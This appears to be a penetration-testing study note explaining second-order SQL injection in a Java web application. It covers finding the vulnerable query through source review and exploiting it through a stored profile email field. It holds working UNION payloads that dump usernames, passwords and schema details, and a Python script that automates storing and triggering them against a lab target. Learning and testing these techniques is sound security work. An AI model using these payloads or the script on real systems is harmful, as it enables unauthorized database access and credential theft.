---
tags: [attack/web, attack]
module: advanced_sql_injections
last_updated: 2026-05-22
source_count: 1
---

# Second-Order SQL Injection

A SQL injection where user-controlled input is **stored** by the application (safely, using parameterized queries) and then **later retrieved and used unsafely** in a second SQL query. Storing the payload and triggering it are two separate requests through separate application features.

## Overview

First-order injection: input → SQL query (same request).
Second-order injection: input → storage (safe) → retrieval → SQL query (separate request).

The storage step often uses parameterized queries, which fools automated scanners and makes the vulnerability harder to spot. The danger is in the second query, which naively concatenates the stored value.

**Why it matters:** automated SQLi scanners (sqlmap, etc.) typically miss second-order injection because they probe and observe a response in the same request. White-box source review is the most reliable discovery method.

---

## Identifying Second-Order Sinks

### Step 1 — Find the sink (the unsafe second query)

```bash
# Grep for string-concatenated SQL that reads from an object/variable (not directly from request params)
grep -nrE '.*sql.*"' --include='*.java' .

# Look for cases where the concatenated value comes from a getter on a model object
# e.g., user.getEmail(), post.getTitle()
```

**Pattern to spot:**
```java
// Safe first query — parameterized, loads user object
sql = "SELECT username, name, description, email, id FROM users WHERE id = ?";
user = jdbcTemplate.queryForObject(sql, new Object[]{id}, ...);

// UNSAFE second query — concatenates a value from the first query's result
sql = "SELECT text, ... FROM posts JOIN users ON ... WHERE email = '"
      + user.getEmail()   // ← this came from the DB, but can be attacker-controlled
      + "' ORDER BY posted_at DESC";
posts = jdbcTemplate.queryForList(sql);
```

### Step 2 — Find the source (how to control the stored value)

```bash
# Find UPDATE statements that include the field used in the sink
grep -irnE 'UPDATE.*email' --include='*.java' .

# Output:
# ProfileController.java:70: sql = "UPDATE users SET name = ?, description = ?, email = ?";
```

Confirm the UPDATE is reachable and the target field is user-controlled. In this case, `/profile/edit` (POST) lets an authenticated user set their own `email` — and that value is later used unsafely in the `/profile/{id}` GET endpoint.

---

## Exploitation

Second-order exploitation is the same as regular injection — the only difference is the two-step process.

### Step 1 — Store the payload (via the safe UPDATE)

Navigate to the profile edit endpoint and set `email` to the injection payload:

```http
POST /profile/edit HTTP/1.1
Content-Type: application/x-www-form-urlencoded

name=pentest&description=test&email=' UNION SELECT '1','2','3','4',5--
```

The UPDATE is parameterized, so the payload is stored **literally** in the database — no injection at this step.

### Step 2 — Trigger the payload (via the vulnerable SELECT)

Load the profile page, which runs the second (unsafe) query using the stored email:

```http
GET /profile/42 HTTP/1.1
```

The assembled query becomes:
```sql
SELECT text, to_char(posted_at, 'dd.mm.yyyy, hh:mi') as posted_at_nice, username, name, author_id
FROM posts JOIN users ON posts.author_id = users.id
WHERE email = '' UNION SELECT '1','2','3','4',5--'
ORDER BY posted_at DESC
```

### Debugging Type Mismatches

If UNION fails with a type error, check the column types from the query and adjust:

```
ERROR: UNION types character varying and integer cannot be matched
```

Map each position: `text, posted_at_nice, username, name` are VARCHAR; `author_id` is INTEGER.

```sql
-- Correct mixed-type UNION payload
' UNION SELECT '1','2','3','4',5--
```

### Full Data Exfiltration

With a working UNION, replace placeholders with actual queries:

```sql
-- Dump all usernames and passwords
' UNION SELECT username||':'||password,'2','3','4',5 FROM users--

-- Dump version and current user
' UNION SELECT VERSION(),'2','3','4',5--

-- Enumerate tables
' UNION SELECT STRING_AGG(table_name,','),'2','3','4',5 FROM information_schema.tables--
```

---

## Automation with Python

```python
import requests

BASE = "http://target:8080"
SESSION = requests.Session()

# Step 0: authenticate
SESSION.post(f"{BASE}/login", data={"username": "pentest", "password": "Password1!"})

def second_order_union(query, col_count=5, varchar_cols=[0,1,2,3], int_cols=[4]):
    """
    Store a UNION payload in the email field, then trigger it by loading the profile.
    query: the SELECT to inject into col position 0 (VARCHAR column)
    """
    cols = ["'X'" for _ in range(col_count)]
    cols[0] = f"({query})"
    for i in int_cols:
        cols[i] = str(i + 1)  # integer literals for INT columns

    payload = "' UNION SELECT " + ",".join(cols) + "--"

    # Store
    SESSION.post(f"{BASE}/profile/edit",
        data={"name": "pentest", "description": "x", "email": payload})

    # Trigger — load own profile (find your user ID first)
    r = SESSION.get(f"{BASE}/profile/42")
    return r.text

# Dump version
print(second_order_union("SELECT VERSION()"))

# Dump users
print(second_order_union("SELECT STRING_AGG(username||':'||password,',') FROM users"))
```

---

## Gotchas & Notes

- The payload must survive the storage step. If the UPDATE endpoint has its own validation (length limits, character filters), the payload may be truncated or sanitised before storage. Check `/profile/edit` source code for any validation.
- The trigger endpoint may require knowing the target user's numeric ID — enumerate IDs if necessary (often sequential integers).
- If the UPDATE is also unsafe (not parameterized), you have two injection points. Exploit the first-order one directly; it's simpler.
- Second-order injection is particularly insidious in multi-tenant apps — an attacker can store a payload in their own account and trigger it when an admin views the attacker's profile.

## Related Pages

- [[attack/web/white_box_sqli_methodology]] — how to find the sink/source pair via source review
- [[attack/web/advanced_sqli_character_bypasses]] — if the storage step has a character filter
- [[attack/web/error_based_sqli]] — alternative exfiltration when UNION is not available
- [[attack/web/postgresql_file_read_write]] — escalating from SQLi to file access
- [[tools/utility/psql]] — validate payloads directly against the database

## Sources

- raw/advanced_sql_injections/advanced_sql_injection_techniques_second_order_sql_injections.md
